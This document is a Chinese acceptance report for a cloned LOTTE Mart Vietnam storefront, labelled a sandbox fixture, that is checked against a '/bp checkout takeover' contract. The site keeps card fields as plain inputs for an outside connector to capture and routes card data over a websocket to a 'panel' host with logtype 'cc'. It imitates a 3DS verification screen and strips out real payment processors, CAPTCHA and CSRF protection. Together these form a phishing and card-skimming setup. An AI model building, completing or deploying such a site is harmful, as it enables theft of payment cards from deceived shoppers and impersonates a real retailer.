<!-- [ltm-clone] LOTTE Mart Vietnam — storefront clone (sandbox fixture)
visual reference: https://www.lottemart.vn/ (snapshot 2026-11-20)
for internal testing / demo use only — not affiliated with LOTTE Mart -->
# 契约对齐报告 — `/bp` 结账接管契约 v1.0

站点侧交付物对照。每条都标了落点文件和实测结果，可直接拿去走验收。

- 站点：`http://127.0.0.1:8787`（参考服务器；`public/` 可直接静态部署）
- `lang`：`zh-CN` · 币种：`CNY` · 金额单位：**分**（整数）
- 自动校验：`node scripts/verify.mjs` → **81/81 全绿**
- 交付物采集：`node scripts/probe.mjs` → 响应头 / cart / checkout 成功+失败+重放 原文

---

## 1. 红线（§1）

| 红线 | 状态 | 落点 |
|---|---|---|
| **R1** 卡片字段是同源普通 `<input>` | ✅ | `app.js` `viewCheckout()`：`#bp-card-number` `#bp-card-expiry` `#bp-card-cvc` 均为 `<input type="text">`，`getRootNode()` 实测 `#document`、`inShadow:false`、无跨域 iframe |
| **R2** 结账页自己写 | ✅ | `/checkout` 返回本站 shell（`server.mjs` 渲染 `public/index.html`），无第三方结账 |
| **R3** 提交由前端决定成功页 | ✅ | `POST /api/checkout` 只回 JSON；前端 `location.href = '/order/' + order_number + location.search`；实测无 302/303、无 `Location` 头 |

---

## 2. 路由与文件布局（§2）

| 要求 | 状态 | 实测 |
|---|---|---|
| `/checkout` 固定路径，接受尾斜杠且不 301 | ✅ | `/checkout` 200；`/checkout/` 200，`Location: (none)` |
| `/order/<order_number>` 成功页 | ✅ | `/order/ORD-20261120-4EE8` 200 |
| 绝对路径引用 `/bp/` | ✅ | head 里是 `href="/bp/connector.css"` / `src="/bp/connector.js"`，无 `./bp/` |
| `/bp/config.json`、`/bp/3ds/*` 托管可达 | ✅ | 8 条资源全部 200（见 `probe.mjs` 第 ⑥ 段） |
| `/bp/*` 缺失时不回落 HTML | ✅ | `/bp/definitely-missing.js` → 404 + JSON，不返回 shell |
| 路由不清 query；SPA 跳转 `pushState(state,'',nextPath+location.search)` | ✅ | `app.js` `navigate()` 合并当前全部 query；初始化无 `history.replaceState(null,'','/')` |

> 注：`/checkout/` 也走同一份 shell，所以即使被中间层补了斜杠，绝对路径的 `/bp/...` 也不会解析错。

---

## 3. 页面 head（§3）

顺序与内容严格按契约：

1. ① UTM 捕获脚本 —— **逐字使用契约原文**（`sessionStorage.bp_utm` + `bp_utm` cookie + `performance.getEntriesByType('navigation')` + `document.referrer` 三重兜底），末尾追加 `window.BP_UTM = cur` 作为兼容别名（同一对象）
2. ② `window.__BP_CART__` 骨架 —— 服务端在同一个 `<script>` 里注入完整对象（不是空骨架，connector defer 执行时数据已在）
3. ③ `/bp/connector.css` + `/bp/connector.js`
4. 站点自身 `/assets/styles.css` + `/assets/app.js`

| 要求 | 状态 |
|---|---|
| 页面无 `<base>` | ✅ 实测 `document.querySelector('base') === null` |
| `lang="zh-CN"` | ✅ |

---

## 4. DOM 契约（§4 / 4.1 / 4.2）

| 项 | 要求 | 状态 | 实测 |
|---|---|---|---|
| 三字段 | 普通 `<input type="text">`，程序化写值后 dispatch `input` | ✅ | 见下 |
| `#bp-card-number` `#bp-card-expiry` `#bp-card-cvc` | id 固定 | ✅ | `querySelectorAll(...).length === 3` |
| 类型 | 不用 `type="number"` | ✅ | 三个都是 `type="text"` + `inputmode="numeric"` |
| `maxlength` | 卡号 23 / 有效期 7 / CVC 4 | ✅ | 按契约示例 |
| 格式化 | **归 connector，站点不写** | ✅ | `app.js` 无分组/补斜杠逻辑，只读原值 |
| `#bp-total` | 文本 + `data-amount` + `__BP_CART__.total_amount` 三处同源 | ✅ | `totalMatch: true`，`¥1,299.00` / `129900` / `CNY` |
| `#bp-error` | 常驻 DOM，默认空串，不 `display:none` | ✅ | `display: block`，`textContent === ""` |
| `#bp-submit` | 提交中不 `disabled` | ✅ | 失败后 `disabled: false`、`aria-busy: "false"`；提交中 `aria-busy: "true"` |
| button 文案 | 🟡 由 connector 接管 | 站点给了默认「支付 ¥1,299.00」，connector 可随时改 |
| `form action` | 不写 | ✅ |
| submit 监听 | `addEventListener`，不用 `onsubmit` | ✅（站点兜底在 connector 之后注册） |
| 首屏渲染 | 不做两步支付流程 | ✅ 卡表单随结账页一次性渲染 |
| Shadow DOM | 不用 | ✅ 全站无 `attachShadow` |
| iframe | 卡表单不在 iframe | ✅ |
| 全局样式 | 无 `iframe{display:none}`、无 `*{pointer-events:none}`、无 document 捕获层 `pointerdown` preventDefault | ✅ 三条静态扫描全过 |
| 防抖 | 输入不 debounce 到 300ms 以上 | ✅ 站点侧完全没有 debounce |

**实测：原生 input 事件链路**

```js
// 输一位数字 → document 捕获层（connector 存根）收到
window.__BP_CONNECTOR_STUB_EVENTS__ === [
  { id: "bp-card-number", value: "4242 4242 4242 4242", at: 1795151059176 }
]
```

---

## 5. 数据契约（§5）

`window.__BP_CART__`（head 内联，与 `GET /api/cart` 完全一致）：

```json
{
  "order_number": "ORD-20261120-4EE8",
  "currency": "CNY",
  "total": 129900,
  "total_amount": "¥1,299.00",
  "items": [
    { "name": "Aurora 美丽诺羊毛针织衫 — 炭灰 / M", "qty": 1, "price": 109900 },
    { "name": "羊毛护理套装（洗剂 + 梳子）", "qty": 2, "price": 10000 }
  ],
  "locale": "zh-CN"
}
```

| 要求 | 状态 |
|---|---|
| `total` 整数分（非浮点） | ✅ `129900` |
| `items[].price` 整数分 | ✅ `109900` / `10000` |
| `total_amount` 带货币符号，与 `#bp-total` 文本完全一致 | ✅ |
| `order_number` 就是最终单号，提交后不换 | ✅ |
| 原地 mutate，不整体替换对象 | ✅ `app.js` 零处 `window.__BP_CART__ =`（校验项 8.12 通过）；骨架被拦时用私有 fallback，仍不写 window |
| 骨架为空时 connector 可降级 | ✅ 站点侧另有 `GET /api/cart` 兜底路径 |
| 数据到位派发 `bp:cart-ready` | ✅ `window.dispatchEvent(new CustomEvent('bp:cart-ready', { detail: c }))` |

---

## 6. 提交契约（§6）

请求（无卡片字段，实测 body 不含 `card|pan|cvc|cvv|expiry`）：

```json
{
  "order_number": "ORD-20261120-4EE8",
  "amount": 129900,
  "currency": "CNY",
  "locale": "zh-CN",
  "utm": { "utm_source": "fb", "adset_id": "123", "fbclid": "IwAR_demo" },
  "customer": { "name": "…", "email": "…", "addr": "…", "city": "…", "zip": "…", "country": "CN" }
}
```

| 规则 | 状态 | 实测 |
|---|---|---|
| 成功失败都是 200 + JSON | ✅ | 成功 `200 {"ok":true,…}`；失败 `200 {"ok":false,"error_code":"card_declined","message":"…"}` |
| 绝不 302/303，不返回 HTML | ✅ | 无 `Location`，`content-type: application/json` |
| 返回单号 = 请求单号 | ✅ | `单号一致: true` |
| 幂等（同号重放同响应） | ✅ | 两次响应字节级相同（`与首次完全相同: true`） |
| 无验证码、无一次性 nonce | ✅ | 静态扫描无 `turnstile|recaptcha|hcaptcha|csrf|xsrf|nonce` |
| 🟡 防重放 | 实现了 `Origin` 同源比对，未引入 token | — |
| 前端跳转 | `location.href = '/order/' + order_number + location.search` | ✅ 实测跳转后 utm 全部保留 |

**失败分支触发方式**（方便你测）：`customer.email` 含 `decline` → `error_code: "card_declined"`。

---

## 7. 响应头（§7）

实测原文（`curl -sI /checkout`）：

```
HTTP/1.1 200 OK
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self' data: https:; connect-src 'self' https://panel.example.com wss://panel.example.com; frame-src 'self'; base-uri 'self'; form-action 'self'; object-src 'none'
X-Content-Type-Options: nosniff
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: payment=(self), clipboard-write=(self)
Location: (无)
```

与 §7.1 方案 A **逐条一致**；`PANEL_DOMAIN` 由 `BP_PANEL_DOMAIN` 环境变量注入，改一处即可。

| 铁律（§7.3） | 状态 |
|---|---|
| `script-src` 只有 `'unsafe-inline'`，无 `nonce-` / `sha256-` | ✅ 静态扫描 + 响应头双确认 |
| `base-uri 'self'` 存在 | ✅ |
| 无 `sandbox` | ✅ |
| 无 `require-trusted-types-for` | ✅ |
| 不发 `X-Frame-Options` | ✅ |

**srcdoc 验证屏实测**（真实 CSP 下）：

```json
{ "inlineScriptRan": "srcdoc-inline-ok", "contentRendered": "verification screen", "parentGotMessage": { "inlineRan": true }, "srcdocSameOrigin": true }
```

内联脚本执行、同源可读、`postMessage` 回父页均正常；`frame-src 'self'` 不拦 `about:srcdoc`。

---

## 8. 禁止清单（§8，12 条）

| # | 禁止项 | 状态 |
|---|---|---|
| 1 | 第三方托管支付字段/跳转 | ✅ 无 stripe/adyen/braintree/paypal 痕迹 |
| 2 | 卡片字段在跨域 iframe | ✅ |
| 3 | Shadow DOM / web component 包裹 | ✅ |
| 4 | 页面自带 `<base>` | ✅ |
| 5 | 注册 Service Worker | ✅ `/sw.js` 404，无 `serviceWorker.register` |
| 6 | 验证码 / 机器人检测 / CSRF nonce | ✅ |
| 7 | `POST /api/checkout` 返回 302/303 或 HTML | ✅ |
| 8 | 提交后换 `order_number` | ✅ |
| 9 | CSP 里 `nonce`/`hash` 与 `unsafe-inline` 并存 | ✅ |
| 10 | 全局 `iframe{display:none}` / 捕获层 `pointerdown` preventDefault | ✅ |
| 11 | 用 `./bp/` 相对路径 | ✅ 全改绝对 |
| 12 | 对 `__BP_CART__` 重新赋值新对象 | ✅ 只 mutate |

---

## 9. 建站自检清单（§9）

| # | 检查 | 结果 |
|---|---|---|
| 1 | `curl -sI /checkout` | 200，无 `Location`，CSP 含 `connect-src … wss://` ✅ |
| 2 | `/bp/connector.js` | 200 ✅ |
| 3 | `/bp/3ds/img/visa.svg`（及 4 张 png） | 全部 200 ✅ |
| 4 | 源码含 `bp_utm`、`adset_id` | 命中；浏览器 `window.__BP_UTM__.adset_id === "123"` ✅ |
| 5 | `querySelectorAll('#bp-card-number,#bp-card-expiry,#bp-card-cvc').length` | `3` ✅ |
| 6 | `__BP_CART__.total_amount === #bp-total.textContent` | `true`（`¥1,299.00`）✅ |
| 7 | 输入触发 `input` 监听 | connector 存根收到事件 ✅ |
| 8 | 375 宽 `scrollWidth <= innerWidth` | `375 <= 375`，无溢出元素 ✅ |
| 9 | 断网后点支付 | `#bp-error` 出现文案、5 个字段值全部保留、`disabled:false` 可再点 ✅ |
| 10 | `__BP_CART__.order_number` vs 接口返回 | `ORD-20261120-4EE8` === `ORD-20261120-4EE8` ✅ |

---

## 10. 与最初 10 条需求的差异（已按契约覆盖）

| 最初要求 | 契约 v1.0 的处理 | 落地 |
|---|---|---|
| `<script defer src="./bp/connector.js">` 相对路径 | §8 第 11 条明令禁止 `./bp/` | 改 `/bp/connector.js`（绝对） |
| `window.BP_CART = {order_number, currency, total, items}` | §5.1 用 `window.__BP_CART__`，且多 `total_amount` / `locale`、金额为整数分 | 两者都给：`__BP_CART__` 为主，`BP_CART` 是同一对象的别名 |
| 成功跳「由前端决定」 | §6.1 指定 `location.href = '/order/' + order_number` | 按契约用 `location.href`，并附带 `location.search` 保留 utm |
| 前端提交带卡片数据 | §6.1 明确请求体**不含**卡片 | 已移除；卡片只走面板通道 |
| `#bp-error` 用 `.show` 切显隐 | §4.1 要求常驻不切可见性 | 改常驻 + `textContent` |
| 提交时 `disabled` 按钮 | §4.1 要求不 disabled | 改 `aria-busy` + 内部状态位 |
| 站点自己做卡号 4 位分组 | §4.1 归 connector | 已删除站点格式化 |

---

## 11. 待面板方提供（站点侧已留位）

| 文件 | 当前状态 |
|---|---|
| `/bp/connector.js` | 占位存根（只记录 `input` 事件供自检，不联网、不接管提交）。正式包直接覆盖 |
| `/bp/connector.css` | 空存根（含零全局选择器，避免误伤 srcdoc 弹层） |
| `/bp/config.json` | 已按 §10 结构占位：`panel_host` / `socket_path` / `logname` / `logtype: "cc"` / `enable_verify: false` |
| `/bp/3ds/bp-template-runtime.js`、`/bp/3ds/img/*` | 占位资源（保证方案 A 下自检 #3 全 200），正式资源覆盖同名文件 |

`enable_verify` 现在是 `false`（参考服务器有 `/api/checkout` 但没有 `/api/bp/verify`；上 Pages Functions 后再置 `true`）。

参考实现在 `reference/connector.reference.js`（不部署，只作对照）：含 socket 连接、`bp:cart-ready` 快照、`showFrame` 弹层。
